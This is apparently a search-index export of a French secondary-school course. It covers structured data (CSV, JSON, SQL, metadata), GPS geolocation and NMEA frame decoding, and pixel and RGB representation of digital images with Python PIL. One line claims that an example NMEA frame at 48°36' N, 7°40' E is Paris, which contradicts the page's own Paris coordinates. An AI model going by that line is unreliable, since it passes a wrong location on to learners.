donn\u00e9es"},{"location":"seconde/VII_-_Donnees_Structurees/Fiche_exercices/#exercice-2-manipulation-du-format-csv","title":"Exercice 2 : Manipulation du format CSV","text":"<p>Contexte : Vous disposez d'un fichier CSV contenant des informations sur des animaux de la for\u00eat.</p> <pre><code>Nom,Espece,Habitat,Poids_kg,Longueur_cm\nRusty,Renard roux,For\u00eat temp\u00e9r\u00e9e,6.5,58\nLuna,Chouette hulotte,For\u00eat mixte,0.8,35\nMax,Sanglier,For\u00eat dense,85,120\nBella,Biche,Clairi\u00e8re,45,95\n</code></pre>"},{"location":"seconde/VII_-_Donnees_Structurees/Fiche_exercices/#question-21","title":"Question 2.1","text":"<p>Combien d'animaux sont r\u00e9pertori\u00e9s dans ce fichier ? ______</p>"},{"location":"seconde/VII_-_Donnees_Structurees/Fiche_exercices/#question-22","title":"Question 2.2","text":"<p>Quels sont les champs (colonnes) de ce fichier CSV ?</p>"},{"location":"seconde/VII_-_Donnees_Structurees/Fiche_exercices/#question-23","title":"Question 2.3","text":"<p>Quel animal p\u00e8se le plus lourd ? ______</p>"},{"location":"seconde/VII_-_Donnees_Structurees/Fiche_exercices/#question-24","title":"Question 2.4","text":"<p>Ajoutez une ligne pour un \u00e9cureuil nomm\u00e9 \"Noisette\" de l'esp\u00e8ce \"\u00c9cureuil roux\", vivant en \"For\u00eat de conif\u00e8res\", pesant 0.3 kg et mesurant 20 cm.</p>"},{"location":"seconde/VII_-_Donnees_Structurees/Fiche_exercices/#exercice-3-decouverte-du-format-json","title":"Exercice 3 : D\u00e9couverte du format JSON","text":"<p>Contexte : Voici la fiche d'un renard au format JSON :</p> <pre><code>{\n  \"nom\": \"Rusty\",\n  \"espece\": \"Vulpes vulpes\",\n  \"caracteristiques\": {\n    \"poids\": 6.5,\n    \"longueur\": 58,\n    \"couleur\": \"roux\"\n  },\n  \"habitat\": {\n    \"type\": \"For\u00eat temp\u00e9r\u00e9e\",\n    \"region\": \"Europe\"\n  },\n  \"alimentation\": [\"rongeurs\", \"oiseaux\", \"fruits\"]\n}\n</code></pre>"},{"location":"seconde/VII_-_Donnees_Structurees/Fiche_exercices/#question-31","title":"Question 3.1","text":"<p>Quelle est la couleur de Rusty ? ______</p>"},{"location":"seconde/VII_-_Donnees_Structurees/Fiche_exercices/#question-32","title":"Question 3.2","text":"<p>Dans quelle r\u00e9gion vit-il ? ______</p>"},{"location":"seconde/VII_-_Donnees_Structurees/Fiche_exercices/#question-33","title":"Question 3.3","text":"<p>Combien d'aliments diff\u00e9rents consomme-t-il ? ______</p>"},{"location":"seconde/VII_-_Donnees_Structurees/Fiche_exercices/#question-34","title":"Question 3.4","text":"<p>Quel type de donn\u00e9es repr\u00e9sente le champ \"alimentation\" ? \u2610 Un objet \u2610 Un tableau \u2610 Une cha\u00eene de caract\u00e8res \u2610 Un nombre</p>"},{"location":"seconde/VII_-_Donnees_Structurees/Fiche_exercices/#question-35","title":"Question 3.5","text":"<p>Ajoutez un champ \"age\" avec la valeur 3 dans les caract\u00e9ristiques de Rusty.</p>"},{"location":"seconde/VII_-_Donnees_Structurees/Fiche_exercices/#exercice-4-bases-de-donnees-relationnelles","title":"Exercice 4 : Bases de donn\u00e9es relationnelles","text":"<p>Contexte : Une r\u00e9serve naturelle utilise une base de donn\u00e9es pour g\u00e9rer ses animaux.</p> <p>Table \"Animaux\" : | ID | Nom | Espece_ID | Poids | Date_arrivee | |----|-----|-----------|-------|-------------| | 1 | Rusty | 1 | 6.5 | 2023-03-15 | | 2 | Luna | 2 | 0.8 | 2023-04-20 | | 3 | Max | 3 | 85 | 2023-02-10 |</p> <p>Table \"Especes\" : | ID | Nom_espece | Famille | Regime | |----|------------|---------|--------| | 1 | Renard roux | Canid\u00e9s | Omnivore | | 2 | Chouette hulotte | Strigid\u00e9s | Carnivore | | 3 | Sanglier | Suid\u00e9s | Omnivore |</p>"},{"location":"seconde/VII_-_Donnees_Structurees/Fiche_exercices/#question-41","title":"Question 4.1","text":"<p>Quel est le r\u00f4le de la colonne \"Espece_ID\" dans la table \"Animaux\" ?</p>"},{"location":"seconde/VII_-_Donnees_Structurees/Fiche_exercices/#question-42","title":"Question 4.2","text":"<p>\u00c0 quelle famille appartient Rusty ?</p>"},{"location":"seconde/VII_-_Donnees_Structurees/Fiche_exercices/#question-43","title":"Question 4.3","text":"<p>Combien d'animaux omnivores y a-t-il dans la r\u00e9serve ?</p>"},{"location":"seconde/VII_-_Donnees_Structurees/Fiche_exercices/#question-44","title":"Question 4.4","text":"<p>\u00c9crivez une requ\u00eate SQL simple pour afficher tous les noms d'animaux : <pre><code>SELECT _____ FROM _____;\n</code></pre></p>"},{"location":"seconde/VII_-_Donnees_Structurees/Fiche_exercices/#exercice-5-metadonnees","title":"Exercice 5 : M\u00e9tadonn\u00e9es","text":"<p>Contexte : Voici un exemple de m\u00e9tadonn\u00e9es pour un fichier de donn\u00e9es :</p> <pre><code>{\n  \"fichier\": \"animaux_foret.csv\",\n  \"description\": \"Inventaire des animaux de la for\u00eat de Fontainebleau\",\n  \"date_creation\": \"2024-01-15\",\n  \"auteur\": \"Service des Eaux et For\u00eats\",\n  \"nombre_lignes\": 150,\n  \"colonnes\": [\n    {\"nom\": \"espece\", \"type\": \"texte\"},\n    {\"nom\": \"poids\", \"type\": \"nombre\"}\n  ]\n}\n</code></pre>"},{"location":"seconde/VII_-_Donnees_Structurees/Fiche_exercices/#question-51","title":"Question 5.1","text":"<p>Que sont les m\u00e9tadonn\u00e9es ?</p>"},{"location":"seconde/VII_-_Donnees_Structurees/Fiche_exercices/#question-52","title":"Question 5.2","text":"<p>Combien d'animaux sont r\u00e9pertori\u00e9s dans ce fichier ?</p>"},{"location":"seconde/VII_-_Donnees_Structurees/Fiche_exercices/#question-53","title":"Question 5.3","text":"<p>Qui a cr\u00e9\u00e9 ce fichier de donn\u00e9es ?</p>"},{"location":"seconde/VII_-_Donnees_Structurees/Fiche_exercices/#question-54","title":"Question 5.4","text":"<p>Pourquoi est-il important d'avoir des m\u00e9tadonn\u00e9es ?</p>"},{"location":"seconde/VII_-_Donnees_Structurees/Fiche_exercices/#exercice-6-applications-pratiques","title":"Exercice 6 : Applications pratiques","text":""},{"location":"seconde/VII_-_Donnees_Structurees/Fiche_exercices/#question-61","title":"Question 6.1","text":"<p>Donnez un exemple d'utilisation des donn\u00e9es structur\u00e9es dans chacun des domaines suivants :</p> <ul> <li>Domotique : ________</li> <li>Sant\u00e9 : ______</li> <li>Commerce en ligne : _______</li> <li>R\u00e9seaux sociaux : _________</li> </ul>"},{"location":"seconde/VII_-_Donnees_Structurees/Fiche_exercices/#question-62","title":"Question 6.2","text":"<p>Vous devez cr\u00e9er une application pour g\u00e9rer une biblioth\u00e8que. Quels formats de donn\u00e9es utiliseriez-vous pour :</p> <ul> <li>Stocker la liste des livres : ______</li> <li>Configurer l'application : ______</li> <li>Rechercher des livres : ______</li> <li>\u00c9changer des donn\u00e9es avec d'autres biblioth\u00e8ques : ______</li> </ul>"},{"location":"seconde/VI_-_Geolocalisation/La%20G%C3%A9olocalisation_22_23/","title":"\ud83c\udf0d G\u00e9olocalisation","text":""},{"location":"seconde/VI_-_Geolocalisation/La%20G%C3%A9olocalisation_22_23/#point-historique-et-definitions","title":"Point Historique et D\u00e9finitions","text":"<p>\ud83d\udcda Historique</p> <p>La g\u00e9olocalisation trouve ses origines dans les besoins militaires des ann\u00e9es 1960. L'arm\u00e9e am\u00e9ricaine d\u00e9veloppe alors le GPS (Global Positioning System) pour am\u00e9liorer la pr\u00e9cision de ses op\u00e9rations.</p> <p>Le premier satellite GPS est envoy\u00e9 dans l'espace dans les ann\u00e9es 1980, marquant le d\u00e9but d'une r\u00e9volution technologique qui transformera notre rapport \u00e0 l'espace et \u00e0 la navigation.</p> <p>Dans les ann\u00e9es 1990, le GPS devient accessible au grand public, ouvrant la voie aux applications civiles que nous connaissons aujourd'hui.</p> <p>D'autres puissances d\u00e9veloppent leurs propres syst\u00e8mes : l'Europe lance Galileo (plus pr\u00e9cis que le GPS am\u00e9ricain), la Russie dispose de GLONASS, et la Chine d\u00e9veloppe BeiDou.</p> <p>Aujourd'hui, la g\u00e9olocalisation est omnipr\u00e9sente dans notre quotidien : smartphones, voitures, montres connect\u00e9es, applications de livraison...</p> <p>\ud83d\udcd6 D\u00e9finition</p> <p>La g\u00e9olocalisation est une technique permettant de situer de mani\u00e8re pr\u00e9cise un lieu, une personne ou un objet sur la plan\u00e8te gr\u00e2ce \u00e0 des coordonn\u00e9es g\u00e9ographiques.</p> <p>Pour localiser un point sur Terre, on utilise un syst\u00e8me de coordonn\u00e9es bas\u00e9 sur trois dimensions :</p> Coordonn\u00e9e D\u00e9finition Unit\u00e9 Exemple (Paris) Latitude Angle par rapport \u00e0 l'\u00e9quateur Degr\u00e9s 48.8588897\u00b0 N Longitude Angle par rapport au m\u00e9ridien de Greenwich Degr\u00e9s 2.320041\u00b0 E Altitude Hauteur par rapport au niveau de la mer M\u00e8tres 35 m <p> </p>"},{"location":"seconde/VI_-_Geolocalisation/La%20G%C3%A9olocalisation_22_23/#fonctionnement-de-la-geolocalisation-par-satellite","title":"Fonctionnement de la g\u00e9olocalisation par satellite","text":"<p>\ud83d\udcd6 D\u00e9finition</p> <p>La trilat\u00e9ration est la technique math\u00e9matique utilis\u00e9e pour d\u00e9terminer une position en mesurant les distances depuis au moins trois points de r\u00e9f\u00e9rence connus (les satellites).</p> <p>Le principe est simple : chaque satellite \u00e9met un signal contenant l'heure pr\u00e9cise d'\u00e9mission et sa position. Le r\u00e9cepteur GPS calcule le temps de trajet du signal pour d\u00e9terminer sa distance \u00e0 chaque satellite.</p> <p></p>"},{"location":"seconde/VI_-_Geolocalisation/La%20G%C3%A9olocalisation_22_23/#le-processus-de-localisation","title":"Le processus de localisation","text":"<p>\u00c9tape 1 : Le r\u00e9cepteur GPS capte les signaux d'au moins 4 satellites - 3 satellites pour d\u00e9terminer la position (x, y, z) - 1 satellite suppl\u00e9mentaire pour la synchronisation temporelle</p> <p>\u00c9tape 2 : Calcul des distances gr\u00e2ce au temps de trajet des signaux - Vitesse du signal = vitesse de la lumi\u00e8re (300 000 km/s) - Distance = Vitesse \u00d7 Temps de trajet</p> <p>\u00c9tape 3 : R\u00e9solution math\u00e9matique pour trouver le point d'intersection</p> <p>Warning</p> <p>La pr\u00e9cision d\u00e9pend de nombreux facteurs : nombre de satellites visibles, conditions m\u00e9t\u00e9orologiques, obstacles (b\u00e2timents, relief), qualit\u00e9 du r\u00e9cepteur.</p> <p>Activit\u00e9 : Explorez le principe de la trilat\u00e9ration avec cette simulation interactive : Activit\u00e9 : Trilat\u00e9ration</p>"},{"location":"seconde/VI_-_Geolocalisation/La%20G%C3%A9olocalisation_22_23/#applications-le-calcul-ditineraires","title":"Applications : Le calcul d'itin\u00e9raires","text":"<p>Une fois la position d\u00e9termin\u00e9e, les syst\u00e8mes de navigation utilisent des algorithmes de routage pour calculer le meilleur chemin entre deux points.</p> <p>Les param\u00e8tres pris en compte :</p> Crit\u00e8re Description Exemple Distance Chemin le plus court 15 km vs 18 km Temps Trajet le plus rapide 20 min vs 25 min Trafic Conditions en temps r\u00e9el Embouteillages, accidents Type de route Pr\u00e9f\u00e9rences utilisateur \u00c9viter autoroutes/p\u00e9ages Mode de transport Adaptation au v\u00e9hicule Voiture, v\u00e9lo, pi\u00e9ton <p>Exemple concret : Trajet Paris \u2192 Lyon - Itin\u00e9raire rapide : A6 (autoroute) - 4h30 - 465 km - Itin\u00e9raire \u00e9conomique : Routes nationales - 6h15 - 445 km - Itin\u00e9raire touristique : Routes d\u00e9partementales - 7h00 - 520 km</p> <p>Les applications comme Google Maps, Waze ou Plans combinent : - Donn\u00e9es cartographiques statiques - Informations trafic en temps r\u00e9el - Signalements utilisateurs (accidents, travaux) - Intelligence artificielle pour pr\u00e9dire les conditions</p>"},{"location":"seconde/VI_-_Geolocalisation/La%20G%C3%A9olocalisation_22_23/#le-protocole-nmea-0183-communication-des-donnees-gps","title":"Le protocole NMEA-0183 : Communication des donn\u00e9es GPS","text":"<p>\ud83d\udcd6 D\u00e9finition</p> <p>Le protocole NMEA-0183 est un standard de communication d\u00e9velopp\u00e9 par la National Marine Electronics Association (NMEA) pour transmettre les donn\u00e9es de g\u00e9olocalisation sous forme de trames textuelles facilement d\u00e9codables.</p> <p>Ce protocole permet aux r\u00e9cepteurs GPS de communiquer leurs informations de position \u00e0 d'autres appareils (ordinateurs, smartphones, syst\u00e8mes de navigation).</p>"},{"location":"seconde/VI_-_Geolocalisation/La%20G%C3%A9olocalisation_22_23/#formats-de-coordonnees","title":"Formats de coordonn\u00e9es","text":"<p>Il existe plusieurs fa\u00e7ons d'exprimer les coordonn\u00e9es g\u00e9ographiques :</p> Format Description Exemple (Paris) D\u00e9cimal Degr\u00e9s avec d\u00e9cimales 48.8588897\u00b0 N DMS Degr\u00e9s, Minutes, Secondes 48\u00b051'32'' N NMEA Degr\u00e9s et minutes d\u00e9cimales 4851.533' N <p>Warning</p> <p>Conversion : 1 degr\u00e9 = 60 minutes, 1 minute = 60 secondes</p>"},{"location":"seconde/VI_-_Geolocalisation/La%20G%C3%A9olocalisation_22_23/#structure-dune-trame-nmea","title":"Structure d'une trame NMEA","text":"<p>Exemple de trame GPGGA (position GPS) :</p> <pre><code>$GPGGA,064036.289,4836.5375,N,00740.9373,E,1,04,3.2,200.2,M,,,,0000*0E\n</code></pre> <p>D\u00e9codage de la trame :</p> Champ Valeur Signification $GPGGA Type de trame Global Positioning System Fix Data 064036.289 Heure UTC 06h 40min 36,289s 4836.5375,N Latitude 48\u00b036,5375' Nord 00740.9373,E Longitude 7\u00b040,9373' Est 1 Qualit\u00e9 du signal 1 = GPS fixe 04 Nombre de satellites 4 satellites utilis\u00e9s 3.2 Pr\u00e9cision horizontale 3,2 m\u00e8tres 200.2,M Altitude 200,2 m\u00e8tres <p>Cette trame correspond \u00e0 la position de Paris.</p>"},{"location":"seconde/VI_-_Geolocalisation/La%20G%C3%A9olocalisation_22_23/#applications-pratiques","title":"Applications pratiques","text":""},{"location":"seconde/VI_-_Geolocalisation/La%20G%C3%A9olocalisation_22_23/#exercices-sur-les-coordonnees-gps","title":"Exercices sur les coordonn\u00e9es GPS","text":"<p>Activit\u00e9 1 : Localisation du lyc\u00e9e Sur votre t\u00e9l\u00e9phone ou Google Maps, retrouvez les coordonn\u00e9es GPS du lyc\u00e9e.</p> <p>Activit\u00e9 2 : Exploration urbaine Recherchez les coordonn\u00e9es GPS de la Tour Eiffel \u00e0 Paris et de la Statue de la Libert\u00e9 \u00e0 New York. Calculez la distance entre ces deux lieux en utilisant l'outil Lexilogos.</p> <p>Activit\u00e9 3 : M\u00e9tadonn\u00e9es de photos Retrouvez les coordonn\u00e9es GPS des lieux o\u00f9 ont \u00e9t\u00e9 prises les photos fournies en annexe gr\u00e2ce \u00e0 leurs m\u00e9tadonn\u00e9es EXIF.</p>"},{"location":"seconde/VI_-_Geolocalisation/La%20G%C3%A9olocalisation_22_23/#exercices-de-decodage-nmea","title":"Exercices de d\u00e9codage NMEA","text":"<p>Activit\u00e9 4 : D\u00e9codage de trames \u00c0 l'aide du site NMEA Decoder, identifiez les villes correspondant aux trames NMEA suivantes :</p> <pre><code>$GPGGA,175737.303,4449.833,N,00034.772,W,1,04,1.0,0.0,M,0.0,M,,*7C\n$GPGGA,175736.303,5038.047,N,00303.695,E,1,03,1.0,0.0,M,0.0,M,,*68\n$GPGGA,175738.303,4545.175,N,00450.039,E,1,12,1.0,0.0,M,0.0,M,,*69\n</code></pre> <p>Activit\u00e9 5 : Analyse d\u00e9taill\u00e9e Analysez la trame suivante :</p> <pre><code>$GPGGA,175736.303,4533.786,N,00554.803,E,1,05,1.0,154.3,M,0.0,M,,*68\n</code></pre> <p>Combien de satellites ont \u00e9t\u00e9 utilis\u00e9s ?</p> <p>\u00c0 quelle hauteur est situ\u00e9 l'objet ?</p> <p>\u00c0 quelle ville correspondent ces coordonn\u00e9es : 41.921; 8.735 ?</p>"},{"location":"seconde/VI_-_Geolocalisation/La%20G%C3%A9olocalisation_22_23/#enjeux-et-perspectives","title":"Enjeux et perspectives","text":"<p>La g\u00e9olocalisation soul\u00e8ve des questions importantes : - Vie priv\u00e9e : Tra\u00e7abilit\u00e9 des d\u00e9placements, donn\u00e9es personnelles - S\u00e9curit\u00e9 : D\u00e9pendance aux satellites, vuln\u00e9rabilit\u00e9 aux interf\u00e9rences - Pr\u00e9cision : Am\u00e9lioration continue (Galileo, GPS III) - Applications futures : V\u00e9hicules autonomes, IoT, r\u00e9alit\u00e9 augment\u00e9e</p> <p>Danger</p> <p>Attention : La g\u00e9olocalisation peut \u00eatre utilis\u00e9e \u00e0 des fins de surveillance. Il est important de ma\u00eetriser les param\u00e8tres de confidentialit\u00e9 de vos appareils.</p>"},{"location":"seconde/V_-_Photographie_Numerique/c_1_Photographie_Noir_et_Blanc/","title":"\ud83d\udcf8 Photographie Num\u00e9rique 1 : Images en Noir et Blanc","text":""},{"location":"seconde/V_-_Photographie_Numerique/c_1_Photographie_Noir_et_Blanc/#histoire-de-la-photographie-numerique","title":"\ud83d\udcda Histoire de la photographie num\u00e9rique","text":"<p>La photographie num\u00e9rique trouve ses origines dans les ann\u00e9es 1970 avec les premiers capteurs CCD (Charge-Coupled Device) d\u00e9velopp\u00e9s par Willard Boyle et George Smith aux laboratoires Bell. Ces travaux leur vaudront le prix Nobel de physique en 2009.</p> <p>Le premier appareil photo num\u00e9rique grand public, le Kodak DCS-100, est commercialis\u00e9 en 1991 pour la somme de 13 000 dollars. Il fallait attendre les ann\u00e9es 2000 pour voir la d\u00e9mocratisation de cette technologie avec l'arriv\u00e9e des premiers appareils accessibles au grand public.</p> <p>Aujourd'hui, chaque smartphone contient un capteur num\u00e9rique capable de produire des images de plusieurs millions de pixels, r\u00e9volutionnant notre rapport \u00e0 la photographie.</p>"},{"location":"seconde/V_-_Photographie_Numerique/c_1_Photographie_Noir_et_Blanc/#quest-ce-quune-image-numerique","title":"\ud83d\udcd6 Qu'est-ce qu'une image num\u00e9rique ?","text":"<p>\ud83d\udcd6 D\u00e9finition</p> <p>Une image num\u00e9rique est un tableau \u00e0 deux dimensions compos\u00e9 de cases \u00e9l\u00e9mentaires appel\u00e9es pixels (contraction de Picture Element). Chaque pixel contient une information de couleur ou de luminosit\u00e9.</p>"},{"location":"seconde/V_-_Photographie_Numerique/c_1_Photographie_Noir_et_Blanc/#caracteristiques-fondamentales-dune-image","title":"\ud83d\udd0d Caract\u00e9ristiques fondamentales d'une image","text":"Caract\u00e9ristique D\u00e9finition Exemple Coordonn\u00e9es Position d'un pixel dans l'image (i, j) Pixel en position (150, 200) D\u00e9finition Nombre total de pixels (hauteur \u00d7 largeur) 800 \u00d7 600 = 480 000 pixels R\u00e9solution Nombre de pixels par unit\u00e9 de longueur (ppp) 300 ppp pour l'impression Mode Type d'information stock\u00e9e par pixel Noir/blanc, niveaux de gris, couleur <p>Activit\u00e9 : Calculs sur les images</p> <p>1. Calculez la d\u00e9finition d'un \u00e9cran 4K (4096 \u00d7 2160 pixels)</p> <p>2. Une image Full HD (1920 \u00d7 1080) est imprim\u00e9e sur 20cm \u00d7 30cm. Calculez sa r\u00e9solution.</p>"},{"location":"seconde/V_-_Photographie_Numerique/c_1_Photographie_Noir_et_Blanc/#les-images-en-noir-et-blanc","title":"\ud83d\udcd6 Les images en noir et blanc","text":"<p>\ud83d\udcd6 D\u00e9finition</p> <p>Une image en noir et blanc (ou binaire) est un tableau \u00e0 deux dimensions o\u00f9 chaque pixel ne peut prendre que deux valeurs : noir ou blanc.</p>"},{"location":"seconde/V_-_Photographie_Numerique/c_1_Photographie_Noir_et_Blanc/#representation-en-memoire","title":"\ud83d\udcbe Repr\u00e9sentation en m\u00e9moire","text":"<p>Pour stocker ces images, l'ordinateur utilise le syst\u00e8me binaire :</p> Couleur Valeur num\u00e9rique Repr\u00e9sentation binaire Noir 0 0 Blanc 1 1 <p>Chaque pixel occupe donc exactement 1 bit en m\u00e9moire, ce qui rend ces images tr\u00e8s l\u00e9g\u00e8res.</p> <p>Activit\u00e9 : D\u00e9codage d'images binaires</p> <p>1. Dessinez l'image correspondant \u00e0 ce tableau binaire :</p> <p></p> <p>2. Cr\u00e9ez le tableau binaire pour cette image :</p> <p></p> <p>Warning</p> <p>Les images en noir et blanc pur sont limit\u00e9es pour repr\u00e9senter la r\u00e9alit\u00e9. C'est pourquoi on utilise souvent les niveaux de gris pour plus de nuances.</p>"},{"location":"seconde/V_-_Photographie_Numerique/c_1_Photographie_Noir_et_Blanc/#les-images-en-niveaux-de-gris","title":"\ud83d\udcd6 Les images en niveaux de gris","text":"<p>\ud83d\udcd6 D\u00e9finition</p> <p>Une image en niveaux de gris est un tableau \u00e0 deux dimensions o\u00f9 chaque pixel contient une valeur d'intensit\u00e9 lumineuse comprise entre 0 (noir) et 255 (blanc), soit 256 nuances possibles.</p>"},{"location":"seconde/V_-_Photographie_Numerique/c_1_Photographie_Noir_et_Blanc/#echelle-des-gris","title":"\ud83c\udfa8 \u00c9chelle des gris","text":"Valeur Couleur Pourcentage de luminosit\u00e9 0 Noir pur 0% 127 Gris moyen 50% 255 Blanc pur 100% <p>Info</p> <p>Plus la valeur est \u00e9lev\u00e9e, plus le pixel tend vers le blanc. Plus elle est faible, plus il tend vers le noir.</p>"},{"location":"seconde/V_-_Photographie_Numerique/c_1_Photographie_Noir_et_Blanc/#stockage-en-memoire","title":"\ud83d\udcbe Stockage en m\u00e9moire","text":"<p>Chaque pixel n\u00e9cessite 8 bits (1 octet) pour stocker sa valeur : - Valeur minimale : 0 = 0000 0000 en binaire - Valeur maximale : 255 = 1111 1111 en binaire</p> <p></p> <p>Activit\u00e9 : Conversion d\u00e9cimal-binaire</p> <p>Convertissez ces valeurs de gris en binaire :</p> Valeur d\u00e9cimale Nuance de gris Valeur binaire 0 Noir 64 Gris fonc\u00e9 128 Gris moyen 192 Gris clair 255 Blanc"},{"location":"seconde/V_-_Photographie_Numerique/c_2_Photographie_Couleur/","title":"\ud83d\udcf8 Photographie Num\u00e9rique 2 : Les Images en Couleur","text":""},{"location":"seconde/V_-_Photographie_Numerique/c_2_Photographie_Couleur/#histoire-de-la-photographie-couleur","title":"\ud83d\udcda Histoire de la photographie couleur","text":"<p>La photographie couleur na\u00eet en 1861 gr\u00e2ce aux travaux du physicien \u00e9cossais James Clerk Maxwell, qui r\u00e9alise la premi\u00e8re photographie couleur en superposant trois images prises \u00e0 travers des filtres rouge, vert et bleu.</p> <p>Le proc\u00e9d\u00e9 Autochrome des fr\u00e8res Lumi\u00e8re (1907) d\u00e9mocratise la couleur, suivi par le Kodachrome (1935) et le Polaroid couleur (1963). L'\u00e8re num\u00e9rique r\u00e9volutionne cette approche avec les capteurs CCD puis CMOS, permettant la capture directe des trois composantes colorim\u00e9triques.</p> <p>Aujourd'hui, chaque smartphone capture des images couleur de qualit\u00e9 professionnelle gr\u00e2ce \u00e0 des capteurs de plusieurs millions de pixels.</p>"},{"location":"seconde/V_-_Photographie_Numerique/c_2_Photographie_Couleur/#vision-humaine-et-capteurs-numeriques","title":"\ud83d\udcd6 Vision humaine et capteurs num\u00e9riques","text":""},{"location":"seconde/V_-_Photographie_Numerique/c_2_Photographie_Couleur/#le-fonctionnement-de-lil-humain","title":"\ud83d\udc41\ufe0f Le fonctionnement de l'\u0153il humain","text":"<p>\ud83d\udcd6 D\u00e9finition</p> <p>L'\u0153il humain fonctionne comme un appareil photo biologique, capable de percevoir les couleurs gr\u00e2ce \u00e0 des cellules sp\u00e9cialis\u00e9es appel\u00e9es c\u00f4nes.</p> Composant Fonction \u00c9quivalent photo Corn\u00e9e Convergence des rayons lumineux Lentille frontale Iris Contr\u00f4le de la quantit\u00e9 de lumi\u00e8re Diaphragme Cristallin Mise au point Objectif R\u00e9tine Capture de l'image Capteur C\u00f4nes D\u00e9tection des couleurs (R, V, B) Photosites <p>Info</p> <p>L'\u0153il contient environ 6 millions de c\u00f4nes, avec une pr\u00e9dominance des c\u00f4nes verts (64%), suivis des rouges (32%) et des bleus (4%).</p> <p>Activit\u00e9 : Anatomie de l'\u0153il</p> <p>L\u00e9gendez le sch\u00e9ma de l'\u0153il avec les termes appropri\u00e9s :</p> <p></p>"},{"location":"seconde/V_-_Photographie_Numerique/c_2_Photographie_Couleur/#le-capteur-photographique-numerique","title":"\ud83d\udcf7 Le capteur photographique num\u00e9rique","text":"<p>\ud83d\udcd6 D\u00e9finition</p> <p>Un capteur photographique est un composant \u00e9lectronique qui convertit la lumi\u00e8re en signal \u00e9lectrique, reproduisant le fonctionnement de la r\u00e9tine humaine.</p>"},{"location":"seconde/V_-_Photographie_Numerique/c_2_Photographie_Couleur/#trajet-de-la-lumiere-dans-lappareil-photo","title":"\ud83d\udd04 Trajet de la lumi\u00e8re dans l'appareil photo","text":"\u00c9tape Composant Fonction 1 Objectif Convergence et mise au point 2 Diaphragme Contr\u00f4le de la quantit\u00e9 de lumi\u00e8re 3 Matrice de Bayer Filtrage des couleurs R, V, B 4 Photosites Conversion lumi\u00e8re \u2192 signal \u00e9lectrique"},{"location":"seconde/V_-_Photographie_Numerique/c_2_Photographie_Couleur/#la-matrice-de-bayer","title":"\ud83c\udf08 La matrice de Bayer","text":"<p>Invent\u00e9e par Bryce Bayer chez Kodak en 1976, cette matrice filtre la lumi\u00e8re selon un motif sp\u00e9cifique : - 50% de filtres verts (sensibilit\u00e9 de l'\u0153il) - 25% de filtres rouges - 25% de filtres bleus</p> <p>Activit\u00e9 : Sch\u00e9ma du capteur</p> <p>Compl\u00e9tez le sch\u00e9ma de l'appareil photo num\u00e9rique :</p> <p></p>"},{"location":"seconde/V_-_Photographie_Numerique/c_2_Photographie_Couleur/#representation-des-images-en-couleur","title":"\ud83d\udcd6 Repr\u00e9sentation des images en couleur","text":"<p>\ud83d\udcd6 D\u00e9finition</p> <p>Une image couleur utilise le mod\u00e8le RVB (Rouge, Vert, Bleu) o\u00f9 chaque pixel est d\u00e9fini par trois valeurs comprises entre 0 et 255, repr\u00e9sentant l'intensit\u00e9 de chaque composante colorim\u00e9trique.</p>"},{"location":"seconde/V_-_Photographie_Numerique/c_2_Photographie_Couleur/#le-modele-rvb-rgb","title":"\ud83c\udfa8 Le mod\u00e8le RVB (RGB)","text":"<p>Chaque pixel n\u00e9cessite 24 bits (3 octets) de stockage : - 8 bits pour le rouge (0-255) - 8 bits pour le vert (0-255) - 8 bits pour le bleu (0-255)</p> Couleur Rouge Vert Bleu Code RVB Rouge pur 255 0 0 (255, 0, 0) Vert pur 0 255 0 (0, 255, 0) Bleu pur 0 0 255 (0, 0, 255) Cyan 0 255 255 (0, 255, 255) Magenta 255 0 255 (255, 0, 255) Jaune 255 255 0 (255, 255, 0) Blanc 255 255 255 (255, 255, 255) Noir 0 0 0 (0, 0, 0) Orange Renard 195 88 23 (195, 88, 23) <p>Activit\u00e9 : D\u00e9codage couleur</p> <p>Coloriez les cases selon les valeurs RVB indiqu\u00e9es :</p> <p></p>"},{"location":"seconde/V_-_Photographie_Numerique/c_2_Photographie_Couleur/#traitement-dimages-avec-python","title":"\ud83d\udcd6 Traitement d'images avec Python","text":""},{"location":"seconde/V_-_Photographie_Numerique/c_2_Photographie_Couleur/#la-bibliotheque-pil-python-imaging-library","title":"\ud83d\udc0d La biblioth\u00e8que PIL (Python Imaging Library)","text":"<p>\ud83d\udcd6 D\u00e9finition</p> <p>La biblioth\u00e8que PIL (ou Pillow) est un module Python permettant de manipuler et traiter des images num\u00e9riques de mani\u00e8re programmatique.</p>"},{"location":"seconde/V_-_Photographie_Numerique/c_2_Photographie_Couleur/#fonctions-principales-de-pil","title":"\ud83d\udd27 Fonctions principales de PIL","text":"Fonction Syntaxe Description Ouverture <code>Image.open(\"chemin\")</code> Charge une image depuis un fichier Format <code>image.format</code> Retourne le format de l'image (JPEG, PNG...) Dimensions <code>image.size</code> Retourne (largeur, hauteur) en pixels Mode <code>image.mode</code> Retourne le mode (RGB, L, RGBA...) D\u00e9coupage <code>image.crop((x1,y1,x2,y2))</code> D\u00e9coupe une zone rectangulaire S\u00e9paration <code>image.split()</code> S\u00e9pare les composantes R, V, B Rotation <code>image.rotate(angle)</code> Fait tourner l'image Conversion <code>image.convert(\"L\")</code> Convertit en niveaux de gris <p>Activit\u00e9 : Analyse de code</p> <p>1. Analysez ce programme et expliquez son fonctionnement :</p> <p></p> <p>2. Programmation pratique</p> <p>\u00c9crivez un programme qui : - Ouvre l'image fournie - La fait tourner de 45 degr\u00e9s - L'affiche</p> <p>3. \u00c9crivez un programme qui s\u00e9pare et affiche les trois composantes RVB d'une image.</p> <p>4. \u00c9crivez un programme qui convertit une image couleur en niveaux de gris.</p>"},{"location":"seconde/V_-_Photographie_Numerique/c_3_Metadonnees/","title":"\ud83d\udcf8 Photographie Num\u00e9rique 3 : Formats, Traitements et M\u00e9tadonn\u00e9es","text":""},{"location":"seconde/V_-_Photographie_Numerique/c_3_Metadonnees/#histoire-des-formats-dimage-numeriques","title":"\ud83d\udcda Histoire des formats d'image num\u00e9riques","text":"<p>Les formats d'image num\u00e9riques \u00e9voluent avec les besoins technologiques. Le GIF (1987) de CompuServe permet les premi\u00e8res animations. Le JPEG (1992) du Joint Photographic Experts Group r\u00e9volutionne la compression d'images. Le PNG (1996) apporte la transparence sans perte.</p> <p>Aujourd'hui, de nouveaux formats comme WebP (Google, 2010) et AVIF (2019) optimisent encore davantage la compression tout en pr\u00e9servant la qualit\u00e9.</p>"},{"location":"seconde/V_-_Photographie_Numerique/c_3_Metadonnees/#extensions-et-formats-dimages","title":"\ud83d\udcd6 Extensions et formats 